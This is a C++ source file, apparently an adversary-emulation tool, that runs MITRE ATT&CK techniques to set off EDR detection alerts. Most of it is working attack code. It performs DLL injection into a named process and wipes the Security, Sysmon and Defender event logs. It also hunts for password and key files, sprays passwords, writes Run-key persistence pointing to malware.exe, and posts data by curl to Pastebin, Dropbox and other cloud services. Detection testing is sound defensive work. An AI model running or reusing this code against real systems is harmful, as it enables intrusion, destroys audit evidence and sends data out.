// MITRE ATT&CK Techniques Implementation
// High-priority techniques for maximum detection coverage

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <iostream>
#include <vector>
#include <string>

class MitreAttackTechniques {
public:
    // T1055.001 - Process Injection: DLL Injection
    static void executeDLLInjection(const std::string& targetProcess, const std::string& dllPath) {
        std::cout << "[T1055.001] Executing DLL Injection into " << targetProcess << std::endl;
        
        // Find target process
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (std::string(pe32.szExeFile) == targetProcess) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        // Allocate memory in target process
                        LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, 
                                                         MEM_COMMIT, PAGE_READWRITE);
                        
                        // Write DLL path
                        WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), 
                                         dllPath.length() + 1, NULL);
                        
                        // Get LoadLibraryA address
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        LPTHREAD_START_ROUTINE pLoadLibrary = 
                            (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
                        
                        // Create remote thread
                        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                                          pLoadLibrary, pRemoteBuf, 0, NULL);
                        
                        std::cout << "[T1055.001] DLL injected successfully" << std::endl;
                        
                        WaitForSingleObject(hThread, 5000);
                        CloseHandle(hThread);
                        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
                        CloseHandle(hProcess);
                    }
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // T1036.005 - Masquerading: Match Legitimate Name or Location
    static void executeProcessMasquerading() {
        std::cout << "[T1036.005] Executing Process Masquerading" << std::endl;
        
        // Copy current executable to Windows directory with legitimate name
        char currentPath[MAX_PATH];
        char systemPath[MAX_PATH];
        
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        GetSystemDirectoryA(systemPath, MAX_PATH);
        
        std::string masqueradePath = std::string(systemPath) + "\\svchost.exe.bak";
        
        if (CopyFileA(currentPath, masqueradePath.c_str(), FALSE)) {
            std::cout << "[T1036.005] Process copied to: " << masqueradePath << std::endl;
            
            // Start the masqueraded process
            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            
            CreateProcessA(masqueradePath.c_str(), NULL, NULL, NULL, FALSE, 
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            
            std::cout << "[T1036.005] Masqueraded process started with PID: " << pi.dwProcessId << std::endl;
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    // T1070.001 - Indicator Removal: Clear Windows Event Logs
    static void executeSelectiveLogClearing() {
        std::cout << "[T1070.001] Executing Selective Event Log Clearing" << std::endl;
        
        // Clear specific event logs that might contain detection data
        const char* eventLogs[] = {
            "Security",
            "System", 
            "Application",
            "Microsoft-Windows-Sysmon/Operational",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-Windows Defender/Operational"
        };
        
        for (const auto& log : eventLogs) {
            std::string cmd = "wevtutil cl \"" + std::string(log) + "\"";
            system(cmd.c_str());
            std::cout << "[T1070.001] Cleared: " << log << std::endl;
        }
        
        // Also try to stop event log service temporarily
        system("sc stop eventlog");
        Sleep(1000);
        system("sc start eventlog");
    }
    
    // T1083 - File and Directory Discovery
    static void executeFileDiscovery() {
        std::cout << "[T1083] Executing File and Directory Discovery" << std::endl;
        
        // Search for interesting files
        std::vector<std::string> searchPatterns = {
            "*.doc*", "*.xls*", "*.pdf", "*.txt",
            "*password*", "*secret*", "*confidential*",
            "*.kdbx", "*.key", "*.pem", "*.pfx"
        };
        
        // Search in common locations
        std::vector<std::string> searchPaths = {
            std::string(getenv("USERPROFILE")) + "\\Desktop",
            std::string(getenv("USERPROFILE")) + "\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Downloads",
            "C:\\Users\\Public\\Documents"
        };
        
        for (const auto& path : searchPaths) {
            std::cout << "[T1083] Searching in: " << path << std::endl;
            
            for (const auto& pattern : searchPatterns) {
                WIN32_FIND_DATAA findData;
                std::string searchPath = path + "\\" + pattern;
                HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
                
                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        std::cout << "[T1083] Found: " << findData.cFileName 
                                 << " (" << findData.nFileSizeLow << " bytes)" << std::endl;
                    } while (FindNextFileA(hFind, &findData));
                    FindClose(hFind);
                }
            }
        }
    }
    
    // T1110.001 - Brute Force: Password Guessing
    static void executePasswordSpray() {
        std::cout << "[T1110.001] Executing Password Spray Attack" << std::endl;
        
        // Common passwords to try
        std::vector<std::string> passwords = {
            "Password123", "Welcome123", "Summer2024", "Winter2024",
            "Company123", "Admin123", "Letmein123"
        };
        
        // Get domain users (simulation)
        std::cout << "[T1110.001] Enumerating domain users..." << std::endl;
        system("net user /domain > C:\\Windows\\Temp\\domain_users.txt 2>&1");
        
        // Simulate authentication attempts
        for (const auto& password : passwords) {
            std::cout << "[T1110.001] Trying password: " << password << std::endl;
            
            // Simulate RDP attempts
            std::string rdpCmd = "cmdkey /generic:TERMSRV/localhost /user:testuser /pass:" + password;
            system(rdpCmd.c_str());
            
            // Simulate SMB attempts
            std::string smbCmd = "net use \\\\localhost\\IPC$ /user:testuser " + password + " 2>&1";
            system(smbCmd.c_str());
            
            Sleep(1000); // Avoid lockout
        }
    }
    
    // T1486 - Data Encrypted for Impact (Ransomware Simulation)
    static void executeRansomwareSimulation() {
        std::cout << "[T1486] Executing Ransomware Simulation" << std::endl;
        
        // Create test files
        std::string testDir = "C:\\Windows\\Temp\\RansomTest";
        CreateDirectoryA(testDir.c_str(), NULL);
        
        // Create dummy files
        for (int i = 0; i < 10; i++) {
            std::string filename = testDir + "\\document_" + std::to_string(i) + ".txt";
            std::ofstream file(filename);
            file << "This is a test document for ransomware simulation.";
            file.close();
            
            // "Encrypt" the file (just rename for simulation)
            std::string encryptedName = filename + ".ENCRYPTED";
            MoveFileA(filename.c_str(), encryptedName.c_str());
            
            std::cout << "[T1486] Encrypted: " << filename << std::endl;
        }
        
        // Create ransom note
        std::string ransomNote = testDir + "\\README_ENCRYPTED.txt";
        std::ofstream note(ransomNote);
        note << "YOUR FILES HAVE BEEN ENCRYPTED!\n";
        note << "This is a SIMULATION for security testing.\n";
        note << "In a real attack, you would need to pay to decrypt.\n";
        note.close();
        
        // Change wallpaper (simulation)
        std::cout << "[T1486] Changing desktop wallpaper..." << std::endl;
        
        // Delete shadow copies (simulation - don't actually do this)
        std::cout << "[T1486] Simulating shadow copy deletion command:" << std::endl;
        std::cout << "vssadmin delete shadows /all /quiet" << std::endl;
    }
    
    // T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
    static void executeDLLHijacking() {
        std::cout << "[T1574.001] Executing DLL Search Order Hijacking" << std::endl;
        
        // Find vulnerable applications that load DLLs from current directory
        std::vector<std::string> targetApps = {
            "notepad.exe", "calc.exe", "mspaint.exe"
        };
        
        // Create a fake DLL in current directory
        std::string dllContent = "This is a fake DLL for hijacking simulation";
        std::ofstream dll("version.dll");
        dll << dllContent;
        dll.close();
        
        std::cout << "[T1574.001] Created fake DLL: version.dll" << std::endl;
        
        // Try to start applications that might load our DLL
        for (const auto& app : targetApps) {
            std::cout << "[T1574.001] Starting " << app << " to trigger DLL load..." << std::endl;
            
            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            
            CreateProcessA(NULL, (LPSTR)app.c_str(), NULL, NULL, FALSE, 
                         CREATE_NO_WINDOW, NULL, ".", &si, &pi);
            
            Sleep(1000);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        // Clean up
        DeleteFileA("version.dll");
    }
    
    // T1082 - System Information Discovery (Enhanced)
    static void executeAdvancedSystemDiscovery() {
        std::cout << "[T1082] Executing Advanced System Information Discovery" << std::endl;
        
        // Detailed system profiling
        system("systeminfo > C:\\Windows\\Temp\\sysinfo.txt");
        system("wmic computersystem get * /format:list >> C:\\Windows\\Temp\\sysinfo.txt");
        system("wmic cpu get * /format:list >> C:\\Windows\\Temp\\sysinfo.txt");
        system("wmic memorychip get * /format:list >> C:\\Windows\\Temp\\sysinfo.txt");
        system("wmic diskdrive get * /format:list >> C:\\Windows\\Temp\\sysinfo.txt");
        
        // Network configuration
        std::cout << "[T1082] Gathering network configuration..." << std::endl;
        system("ipconfig /all > C:\\Windows\\Temp\\netconfig.txt");
        system("netstat -an >> C:\\Windows\\Temp\\netconfig.txt");
        system("arp -a >> C:\\Windows\\Temp\\netconfig.txt");
        system("route print >> C:\\Windows\\Temp\\netconfig.txt");
        
        // Security products
        std::cout << "[T1082] Detecting security products..." << std::endl;
        system("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get * /format:list > C:\\Windows\\Temp\\av_products.txt");
        system("sc query type=service | findstr /i \"defender symantec mcafee kaspersky sophos\" >> C:\\Windows\\Temp\\av_products.txt");
        
        // Installed software
        std::cout << "[T1082] Enumerating installed software..." << std::endl;
        system("wmic product get Name,Version,Vendor /format:csv > C:\\Windows\\Temp\\software.txt");
    }
    
    // T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
    static void executeRegistryPersistence() {
        std::cout << "[T1547.001] Executing Registry Run Key Persistence" << std::endl;
        
        // Multiple registry locations
        std::vector<std::string> regKeys = {
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
        };
        
        for (const auto& key : regKeys) {
            std::string cmd = "reg add \"" + key + "\" /v SecurityTest /t REG_SZ /d \"C:\\Windows\\Temp\\malware.exe\" /f";
            system(cmd.c_str());
            std::cout << "[T1547.001] Added persistence to: " << key << std::endl;
        }
    }
    
    // T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
    static void executeCloudExfiltration() {
        std::cout << "[T1567.002] Executing Cloud Service Exfiltration" << std::endl;
        
        // Simulate uploads to various cloud services
        std::vector<std::string> cloudServices = {
            "https://www.dropbox.com/upload",
            "https://drive.google.com/upload",
            "https://onedrive.live.com/upload",
            "https://mega.nz/upload",
            "https://pastebin.com/api/api_post.php"
        };
        
        // Create data to exfiltrate
        std::string data = "Sensitive data for exfiltration test";
        
        for (const auto& service : cloudServices) {
            std::cout << "[T1567.002] Attempting upload to: " << service << std::endl;
            
            // Simulate HTTP POST
            std::string curlCmd = "curl -X POST -d \"data=" + data + "\" " + service + " 2>&1";
            system(curlCmd.c_str());
        }
    }
};

// Execute all high-priority techniques
void executeAllMitreTechniques() {
    std::cout << "\n=== MITRE ATT&CK TECHNIQUE DEMONSTRATION ===" << std::endl;
    std::cout << "This will trigger multiple detection alerts!" << std::endl;
    
    // T1055.001 - DLL Injection
    MitreAttackTechniques::executeDLLInjection("notepad.exe", "C:\\Windows\\Temp\\test.dll");
    Sleep(2000);
    
    // T1036.005 - Process Masquerading
    MitreAttackTechniques::executeProcessMasquerading();
    Sleep(2000);
    
    // T1070.001 - Clear Event Logs
    MitreAttackTechniques::executeSelectiveLogClearing();
    Sleep(2000);
    
    // T1083 - File Discovery
    MitreAttackTechniques::executeFileDiscovery();
    Sleep(2000);
    
    // T1110.001 - Password Spray
    MitreAttackTechniques::executePasswordSpray();
    Sleep(2000);
    
    // T1486 - Ransomware Simulation
    MitreAttackTechniques::executeRansomwareSimulation();
    Sleep(2000);
    
    // T1574.001 - DLL Hijacking
    MitreAttackTechniques::executeDLLHijacking();
    Sleep(2000);
    
    // T1082 - Advanced System Discovery
    MitreAttackTechniques::executeAdvancedSystemDiscovery();
    Sleep(2000);
    
    // T1547.001 - Registry Persistence
    MitreAttackTechniques::executeRegistryPersistence();
    Sleep(2000);
    
    // T1567.002 - Cloud Exfiltration
    MitreAttackTechniques::executeCloudExfiltration();
    
    std::cout << "\n=== MITRE ATT&CK DEMONSTRATION COMPLETE ===" << std::endl;
    std::cout << "Check your XDR/EDR console - it should be lit up!" << std::endl;
}
